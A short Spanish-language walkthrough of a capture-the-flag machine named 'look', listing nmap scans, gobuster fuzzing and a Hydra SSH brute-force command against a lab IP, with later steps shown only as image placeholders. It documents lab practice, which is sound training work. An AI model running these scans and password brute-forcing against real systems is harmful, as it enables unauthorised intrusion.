# Máquina look

### Reconocimiento de la Ip de la máquina víctima

![alt text](image.png)

### Puertos abiertos

sudo nmap -sS --min-rate 6000 -p- --open -vvv -Pn 192.168.42.163

![alt text](image-1.png)


### Servicios y versiones 

sudo nmap -sVC --min-rate 6000 -p22,80 -vvv -Pn 192.168.42.163

![alt text](image-2.png)


### Fuzzing web

gobuster dir -t 200 -u http://192.168.42.163 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,bak,sh,py,js,html,db,png,jpg,git,swp -b 403,404 2>/dev/null


![alt text](image-3.png)

entramos en /info.php y observamos un usuario axel

![alt text](image-4.png)


### Explotación

hacemos fuerza bruta con hydra:

hydra -l axel -P /usr/share/wordlists/rockyou.txt ssh://192.168.42.163 -t 64 -I

![alt text](image-5.png)

me conecto por ssh:

![alt text](image-6.png)

verificamos que usuarios hay en el sistema:

![alt text](image-7.png)

visualizamos la variable de entorno env y encontramos la contraseña de dylan:

![alt text](image-8.png)

cambiamos al usuario dylan

![alt text](image-9.png)

### Escalar privilegios

![alt text](image-10.png)

![alt text](image-11.png)

### user.txt

![alt text](image-12.png)

### root.txt

![alt text](image-13.png)

